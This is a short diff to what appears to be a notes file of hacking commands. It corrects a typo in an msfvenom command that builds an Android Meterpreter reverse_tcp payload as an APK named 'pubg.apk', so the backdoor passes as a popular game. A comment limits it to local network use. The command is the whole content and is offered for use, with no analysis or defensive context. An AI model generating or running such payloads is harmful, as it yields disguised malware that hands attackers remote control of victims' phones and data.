@@ -4,7 +4,7 @@ All commands and Tools
 
 For Linux ----------->>>>>>>>>>>>>>>>>>>>>>
 
-sudo mafvenom -p android/meterpreter/reverse_tcp LHOST=your ip LPORT=4444 R> apk name(pubg.apk)
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=your ip LPORT=4444 R> apk name(pubg.apk)
 
 
 comment -->>//This is for only for local Area Network
